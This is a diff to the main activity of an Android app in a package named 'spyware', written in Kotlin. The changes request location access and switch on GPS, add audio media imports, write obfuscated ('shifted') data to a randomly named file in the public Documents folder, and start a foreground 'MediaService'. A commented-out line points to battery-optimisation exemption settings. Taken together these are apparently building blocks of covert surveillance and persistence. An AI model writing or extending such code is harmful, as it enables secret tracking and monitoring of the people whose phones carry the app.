@@ -3,10 +3,13 @@ package com.example.spyware
 import android.app.AlertDialog
 import android.content.Context
 import android.content.Intent
+import android.location.Location
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
+import android.provider.MediaStore.Audio.Media
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
@@ -19,9 +22,10 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
 import com.example.spyware.ui.theme.SpywareTheme
 import android.provider.Settings
+import appendShiftedToFile
+import com.example.spyware.common.Constants
 
 class MainActivity : ComponentActivity() {
-    private val REQUEST_CHECK_SETTINGS = 1001
     private var mobileDialogOpen=false
     private lateinit var gpsReader: GpsReader;
 
@@ -41,23 +45,25 @@ class MainActivity : ComponentActivity() {
         }
 
         gpsReader=GpsReader(this)
-//        gpsReader.getLastLocation()
         gpsReader.grantLocationPermission(this)
         gpsReader.turnOnLocation(this)
 
 
-        var encryptedFileIo:EncryptedFileIo=EncryptedFileIo(this)
-        encryptedFileIo.appendEncryptedFile("secrets4.txt","hello world")
+//        appendShiftedToFile(this.filesDir,"secrets.txt","hello world",4)
+        appendShiftedToFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),"23423424.txt","hello world",4)
 
 
-        if(!TimerService.isServiceActive) {
+//        val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
+//        startActivity(intent)
+        if(!MediaService.isServiceActive) {
             this.startForegroundService(
                 Intent(
                     this,
-                    TimerService::class.java
+                    MediaService::class.java
                 )
             );
         }
+
 
     }
 
